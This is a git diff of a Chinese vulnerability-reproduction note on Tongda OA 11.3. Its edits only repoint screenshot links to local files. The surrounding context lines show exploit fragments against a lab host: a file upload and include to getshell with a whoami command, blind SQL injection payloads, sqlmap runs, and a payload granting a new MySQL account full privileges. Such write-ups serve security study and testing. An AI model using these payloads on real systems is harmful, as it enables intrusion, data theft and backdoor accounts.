@@ -1,5 +1,3 @@
-
-
 # 通达OA 11.3
 
 ## 通达OA前台任意文件上传漏洞+文件包含漏洞导致getshell
@@ -89,7 +87,7 @@ echo $stroutput;
 
 得到200状态码，获得图片名称：`1354502767.jpg`
 
-![image-20210409132616556](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210409132616556.png)
+![image-20210409132616556](images/%E9%80%9A%E8%BE%BEOA.assets/image-20210409132616556.png)
 
 ```
 +OK [vm]252@2104_2141129852|jpg|0[/vm]
@@ -121,7 +119,7 @@ json={"url":"/general/../../attach/im/2104/2141129852.jpg"}&cmd=whoami
 
 查看到命令被成功执行了！
 
-![image-20210408161457971](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210408161457971.png)
+![image-20210408161457971](images/%E9%80%9A%E8%BE%BEOA.assets/image-20210408161457971.png)
 
 
 
@@ -226,7 +224,7 @@ python3 tongda_admin.py -v 11 -url http://192.168.16.112:8080/
 
 登录成功
 
-![image-20210409142510681](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210409142510681.png)
+![image-20210409142510681](images/%E9%80%9A%E8%BE%BEOA.assets/image-20210409142510681.png)
 
 
 
@@ -238,11 +236,11 @@ python3 tongda_admin.py -v 11 -url http://192.168.16.112:8080/
 
 登录-个人事务-日程安排-日程查询
 
-![image-20210409145256353](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210409145256353.png)
+![image-20210409145256353](images/%E9%80%9A%E8%BE%BEOA.assets/image-20210409145256353.png)
 
 抓包后点击，截取数据包
 
-![image-20210409145337314](images/%E9%80%9A%E8%BE%BEOA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0.assets/image-20210409145337314.png)
+![image-20210409145337314](images/%E9%80%9A%E8%BE%BEOA.assets/image-20210409145337314.png)
 
 保存到文件，sqlmap跑一下，注入成功
 
@@ -250,7 +248,7 @@ python3 tongda_admin.py -v 11 -url http://192.168.16.112:8080/
 python3 sqlmap.py -r 1.txt
 ```
 
-![image-20210409145454661](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210409145454661.png)
+![image-20210409145454661](images/%E9%80%9A%E8%BE%BEOA.assets/image-20210409145454661.png)
 
 
 
@@ -268,7 +266,7 @@ webroot\general\appbuilder\modules\report\controllers\RepdetailController.php，
 http://192.168.16.112:8080/general/appbuilder/web/report/repdetail/edit?link_type=false&slot={}&id=2
 ```
 
-![image-20210409174727847](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210409174727847.png)
+![image-20210409174727847](images/%E9%80%9A%E8%BE%BEOA.assets/image-20210409174727847.png)
 
 发现跑出了两
 
@@ -306,7 +304,7 @@ http://192.168.16.112:8080/general/email/sentbox/get_index_data.php?asc=0&boxid=
 rlike (select (case when (1=1) then 1 else 0x28 end))
 ```
 
-![image-20210409180855404](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210409180855404.png)
+![image-20210409180855404](images/%E9%80%9A%E8%BE%BEOA.assets/image-20210409180855404.png)
 
 使用手工注入，经过测试发现过滤了单引号，对r字符进行转换成16进制
 
@@ -318,7 +316,7 @@ rlike (select (case when (substr(user(),1,1)='r') then 1 else 0x28 end))
 rlike (select (case when (substr(user(),1,1)=0x72) then 1 else 0x28 end))
 ```
 
-![image-20210409181224477](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210409181224477.png)
+![image-20210409181224477](images/%E9%80%9A%E8%BE%BEOA.assets/image-20210409181224477.png)
 
 
 
@@ -368,7 +366,7 @@ Content-Disposition: form-data; name="SORT_ID"
 
 可以看到，这里存在布尔盲注
 
-![image-20210409184751007](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210409184751007.png)
+![image-20210409184751007](images/%E9%80%9A%E8%BE%BEOA.assets/image-20210409184751007.png)
 
 经过测试发现过滤了单引号，对r字符进行转换成16进制,通过手工最终获得数据库用户名root
 
@@ -428,7 +426,7 @@ else:
     print("[-]Failed to upload file")
 ```
 
-![image-20210409191007550](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210409191007550.png)
+![image-20210409191007550](images/%E9%80%9A%E8%BE%BEOA.assets/image-20210409191007550.png)
 
 
 
@@ -454,7 +452,7 @@ else:
 
 在人员管理面板有一个SQL注入
 
-![image-20210409191824931](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210409191824931.png)
+![image-20210409191824931](images/%E9%80%9A%E8%BE%BEOA.assets/image-20210409191824931.png)
 
 POC：
 
@@ -479,7 +477,7 @@ select if((1=1),1,power(9999,99))、select if((1=2),1,power(9999,99))
 
 判断注入点 #当字符相等时，不报错，错误时报错
 
-![image-20210409193004810](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210409193004810.png)
+![image-20210409193004810](images/%E9%80%9A%E8%BE%BEOA.assets/image-20210409193004810.png)
 
 
 
@@ -489,7 +487,7 @@ select if((1=1),1,power(9999,99))、select if((1=2),1,power(9999,99))
 grant all privileges ON mysql.* TO 'at666'@'%' IDENTIFIED BY 'abcABC@123' WITH GRANT OPTION
 ```
 
-![image-20210409194021160](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210409194021160.png)
+![image-20210409194021160](images/%E9%80%9A%E8%BE%BEOA.assets/image-20210409194021160.png)
 
 
 
@@ -507,13 +505,13 @@ UPDATE `mysql`.`user` SET `Password` = '*DE0742FA79F6754E99FDB9C8D2911226A5A9051
 general/hr/manage/query/delete_cascade.php?condition_cascade=flush privileges;
 ```
 
-![image-20210409194101029](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210409194101029.png)
+![image-20210409194101029](images/%E9%80%9A%E8%BE%BEOA.assets/image-20210409194101029.png)
 
 
 
 再次登录，提示密码过期，需要重新执行grant all privileges ON mysql.* TO 'at666'@'%' IDENTIFIED BY 'abcABC@123' WITH GRANT OPTION
 
-![img](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/1592114-20200918145636404-104307491.png)
+![img](images/%E9%80%9A%E8%BE%BEOA.assets/1592114-20200918145636404-104307491.png)
 
 
 
